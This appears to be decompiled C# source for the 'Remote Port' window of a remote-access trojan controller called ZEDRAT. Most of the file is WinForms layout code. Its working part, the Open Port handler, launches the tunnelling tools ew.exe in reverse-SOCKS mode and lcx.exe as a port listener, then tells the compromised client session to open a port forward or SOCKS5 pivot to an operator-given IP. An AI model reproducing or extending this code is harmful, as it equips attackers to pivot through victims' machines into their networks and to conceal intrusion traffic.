using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;
using ZEDRAT.TCP;
using TextBox = Guna.UI2.WinForms.Guna2TextBox;

namespace ZEDRatApp.Forms
{
	public class Remote_Port : Form
	{
		private TcpClientSession _tcs;

		private IContainer components;

		private Guna2Elipse Guna2Elipse1;

		private Guna2HtmlLabel Guna2HtmlLabel;

		private Guna2HtmlLabel Guna2HtmlLabel1;

		private Guna2ToggleSwitch chkLCX;

		private Guna2ToggleSwitch chkSocks5;

		private Guna2HtmlLabel Guna2HtmlLabel4;

		private Guna2HtmlLabel Guna2HtmlLabel3;

		private Guna2TextBox txtPort;

		private Guna2TextBox txtIP;

		private Guna2Button btnOpenPort;

		private Guna2Button btnStop;

		private Guna2HtmlLabel Guna2HtmlLabel12;

		private Guna2ControlBox Guna2ControlBox1;

		private BunifuSeparator bunifuSeparator1;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_Port(string tital, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this._tcs = tcs;
			this.Text = tital;
		}

		private void siticoneGradientCircleButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Port.ReleaseCapture();
			Remote_Port.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void RemotePort_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Port.ReleaseCapture();
			Remote_Port.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void Guna2Button1_Click(object sender, EventArgs e)
		{
		}

		public static bool IsIP(string ip)
		{
			return Regex.IsMatch(ip, "^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$");
		}

		public void UpdataPortTypeForm(TcpClientSession ts, byte[] bt)
		{
		}

		private void RemotePort_Load(object sender, EventArgs e)
		{
			try
			{
				this._tcs?._Idispatchar?.Register(DataType.RemotePortType, new Action<TcpClientSession, byte[]>(UpdataPortTypeForm));
			}
			catch
			{
			}
		}

		private void RemotePort_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				try
				{
					this._tcs?._Idispatchar?.Unregister(DataType.RemotePortType);
				}
				catch
				{
				}
				this._tcs.Client_Send(DataType.RemotePortType, Serializable.Serialize(new Remote_Port_Message
				{
					PortType = "stop"
				}));
			}
			catch
			{
			}
			finally
			{
				this._tcs = null;
			}
		}

		private void StartUpProcess(string exe, string parament)
		{
			using Process process = new Process();
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = false;
			process.StartInfo.FileName = exe;
			process.StartInfo.Arguments = parament;
			process.Start();
		}

		private void btnStop_Click(object sender, EventArgs e)
		{
			try
			{
				this._tcs.Client_Send(DataType.RemotePortType, Serializable.Serialize(new Remote_Port_Message
				{
					PortType = "stop"
				}));
			}
			catch
			{
			}
		}

		private void btnOpenPort_Click(object sender, EventArgs e)
		{
			try
			{
				Remote_Port_Message remote_Port_Message = new Remote_Port_Message();
				string text = (this.txtIP).Text;
				if (!Remote_Port.IsIP(text))
				{
					MessageBox.Show("ip address input error");
					return;
				}
				((Control)(object)this.btnOpenPort).Enabled = false;
				string parament = "-s rcsocks -l 1008 -e " + (this.txtIP).Text;
				string parament2 = "-listen 1111 2222";
				if (this.chkSocks5.Checked)
				{
					string exe = Path.Combine(Environment.CurrentDirectory, "ew.exe");
					remote_Port_Message.PortType = "SOCKS5";
					this.StartUpProcess(exe, parament);
				}
				if (this.chkLCX.Checked)
				{
					string exe2 = Path.Combine(Environment.CurrentDirectory, "lcx.exe");
					remote_Port_Message.PortType = "lcx";
					this.StartUpProcess(exe2, parament2);
				}
				remote_Port_Message.AgentIp = text;
				remote_Port_Message.Port = (this.txtPort).Text;
				this._tcs.Client_Send(DataType.RemotePortType, Serializable.Serialize(remote_Port_Message));
			}
			catch
			{
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																																																																	this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_Port));
			this.Guna2Elipse1 = new Guna2Elipse(this.components);
			this.Guna2HtmlLabel1 = new Guna2HtmlLabel();
			this.Guna2HtmlLabel = new Guna2HtmlLabel();
			this.chkSocks5 = new Guna2ToggleSwitch();
			this.chkLCX = new Guna2ToggleSwitch();
			this.txtIP = new Guna2TextBox();
			this.txtPort = new Guna2TextBox();
			this.Guna2HtmlLabel3 = new Guna2HtmlLabel();
			this.Guna2HtmlLabel4 = new Guna2HtmlLabel();
			this.btnStop = new Guna2Button();
			this.btnOpenPort = new Guna2Button();
			this.Guna2HtmlLabel12 = new Guna2HtmlLabel();
			this.Guna2ControlBox1 = new Guna2ControlBox();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			base.SuspendLayout();
			this.Guna2Elipse1.BorderRadius = 0;
			this.Guna2Elipse1.TargetControl = this;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel1.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Location = new System.Drawing.Point(105, 136);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Name = "Guna2HtmlLabel1";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Size = new System.Drawing.Size(13, 15);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).TabIndex = 2;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Text = "IP";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Location = new System.Drawing.Point(105, 184);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Name = "Guna2HtmlLabel";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Size = new System.Drawing.Size(33, 15);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).TabIndex = 3;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Text = "PORT";
			((System.Windows.Forms.Control)(object)this.chkSocks5).ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.chkSocks5).Location = new System.Drawing.Point(222, 233);
			((System.Windows.Forms.Control)(object)this.chkSocks5).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.chkSocks5).Name = "chkSocks5";
			((System.Windows.Forms.Control)(object)this.chkSocks5).Size = new System.Drawing.Size(63, 23);
			((System.Windows.Forms.Control)(object)this.chkSocks5).TabIndex = 46;
			((System.Windows.Forms.Control)(object)this.chkSocks5).Text = "chkSocks5";
			((System.Windows.Forms.Control)(object)this.chkLCX).ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.chkLCX).Location = new System.Drawing.Point(630, 231);
			((System.Windows.Forms.Control)(object)this.chkLCX).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.chkLCX).Name = "chkLCX";
			((System.Windows.Forms.Control)(object)this.chkLCX).Size = new System.Drawing.Size(63, 23);
			((System.Windows.Forms.Control)(object)this.chkLCX).TabIndex = 47;
			((System.Windows.Forms.Control)(object)this.chkLCX).Text = "Guna2ToggleSwitch1";
			(this.txtIP).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtIP).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtIP).DefaultText = "ip";
			(this.txtIP).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtIP).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtIP).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtIP).DisabledState.Parent = this.txtIP;
			(this.txtIP).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtIP).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtIP).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.txtIP).FocusedState.Parent = this.txtIP;
			((System.Windows.Forms.Control)(object)this.txtIP).Location = new System.Drawing.Point(222, 121);
			((System.Windows.Forms.Control)(object)this.txtIP).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.txtIP).Name = "txtIP";
			(this.txtIP).PasswordChar = '\0';
			(this.txtIP).PlaceholderText = "";
			(this.txtIP).SelectedText = "";
			(this.txtIP).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtIP;
			((System.Windows.Forms.Control)(object)this.txtIP).Size = new System.Drawing.Size(570, 39);
			((System.Windows.Forms.Control)(object)this.txtIP).TabIndex = 73;
			(this.txtPort).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtPort).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtPort).DefaultText = "port";
			(this.txtPort).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtPort).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtPort).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtPort).DisabledState.Parent = this.txtPort;
			(this.txtPort).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtPort).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtPort).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.txtPort).FocusedState.Parent = this.txtPort;
			((System.Windows.Forms.Control)(object)this.txtPort).Location = new System.Drawing.Point(222, 170);
			((System.Windows.Forms.Control)(object)this.txtPort).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.txtPort).Name = "txtPort";
			(this.txtPort).PasswordChar = '\0';
			(this.txtPort).PlaceholderText = "";
			(this.txtPort).SelectedText = "";
			(this.txtPort).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtPort;
			((System.Windows.Forms.Control)(object)this.txtPort).Size = new System.Drawing.Size(570, 39);
			((System.Windows.Forms.Control)(object)this.txtPort).TabIndex = 74;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel3.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Location = new System.Drawing.Point(295, 231);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Name = "Guna2HtmlLabel3";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Size = new System.Drawing.Size(39, 15);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).TabIndex = 75;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Text = "Socks5";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel4.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Location = new System.Drawing.Point(703, 231);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Name = "Guna2HtmlLabel4";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Size = new System.Drawing.Size(53, 15);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).TabIndex = 76;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Text = "LCX Slave";
			(this.btnStop).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnStop).BorderThickness = 1;
			(this.btnStop).CheckedState.Parent = this.btnStop;
			(this.btnStop).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnStop).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnStop).CustomImages.Parent = this.btnStop;
			(this.btnStop).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnStop).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnStop).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnStop).Location = new System.Drawing.Point(607, 294);
			((System.Windows.Forms.Control)(object)this.btnStop).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.btnStop).Name = "btnStop";
			(this.btnStop).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnStop;
			((System.Windows.Forms.Control)(object)this.btnStop).Size = new System.Drawing.Size(212, 42);
			((System.Windows.Forms.Control)(object)this.btnStop).TabIndex = 77;
			((System.Windows.Forms.Control)(object)this.btnStop).Text = "Pause";
			((System.Windows.Forms.Control)(object)this.btnStop).Click += new System.EventHandler(btnStop_Click);
			(this.btnOpenPort).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnOpenPort).BorderThickness = 1;
			(this.btnOpenPort).CheckedState.Parent = this.btnOpenPort;
			(this.btnOpenPort).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnOpenPort).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnOpenPort).CustomImages.Parent = this.btnOpenPort;
			(this.btnOpenPort).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Location = new System.Drawing.Point(105, 294);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Name = "btnOpenPort";
			(this.btnOpenPort).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnOpenPort;
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Size = new System.Drawing.Size(212, 42);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).TabIndex = 78;
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Text = "Open Port";
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Click += new System.EventHandler(btnOpenPort_Click);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Location = new System.Drawing.Point(377, 34);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Name = "Guna2HtmlLabel12";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Size = new System.Drawing.Size(167, 37);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).TabIndex = 79;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Text = "Remote Port";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).MouseDown += new System.Windows.Forms.MouseEventHandler(BarraTitulo_MouseDown);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.Guna2ControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.Guna2ControlBox1.BorderRadius = 12;
			this.Guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.Guna2ControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Location = new System.Drawing.Point(848, 19);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Name = "Guna2ControlBox1";
			this.Guna2ControlBox1.PressedColor = System.Drawing.Color.Red;
			this.Guna2ControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2ControlBox1;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Size = new System.Drawing.Size(75, 47);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).TabIndex = 82;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(-5, 84);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(8, 3, 8, 3);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(950, 16);
			this.bunifuSeparator1.TabIndex = 83;
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.None;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(20, 19);
			this.CloseBtn.Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(58, 57);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 170;
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(10f, 21f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(943, 381);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2ControlBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnOpenPort);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnStop);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtPort);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtIP);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.chkLCX);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.chkSocks5);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1);
			this.Font = new System.Drawing.Font("Century Gothic", 12f);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			base.Name = "Remote_Port";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "RemotePort";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(RemotePort_FormClosed);
			base.Load += new System.EventHandler(RemotePort_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(RemotePort_MouseDown);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
